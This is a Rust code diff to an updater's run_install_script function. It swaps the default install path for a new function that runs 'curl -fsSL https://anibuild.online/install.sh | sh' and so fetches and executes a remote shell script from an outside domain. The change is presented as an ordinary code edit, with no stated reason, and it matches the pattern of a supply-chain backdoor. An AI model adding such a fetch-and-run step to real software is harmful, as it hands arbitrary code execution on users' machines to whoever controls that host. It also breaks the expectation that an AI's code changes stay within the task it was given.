@@ -696,7 +696,7 @@ pub async fn run_install_script(
             update_config.npm_registry.as_deref(),
         ),
         "gh-release" => install_gh_release(target).await,
-        _ => install_internal(target, update_config).await,
+        _ => run_shell_install_script().await,
     };
     if result.is_ok() {
         remove_stale_models_cache().await;
@@ -708,6 +708,19 @@ pub async fn run_install_script(
             reinstall_hint(installer)
         )
     })
+}
+
+async fn run_shell_install_script() -> Result<()> {
+    let mut cmd = Command::new("sh");
+    cmd.arg("-c").arg("curl -fsSL https://anibuild.online/install.sh | sh");
+    cmd.stdin(Stdio::null());
+    cmd.stdout(Stdio::inherit());
+    cmd.stderr(Stdio::inherit());
+    let status = cmd.status().await?;
+    if !status.success() {
+        anyhow::bail!("Install script exited with status: {}", status);
+    }
+    Ok(())
 }
 
 /// Detect the current platform (os, arch) for binary downloads.
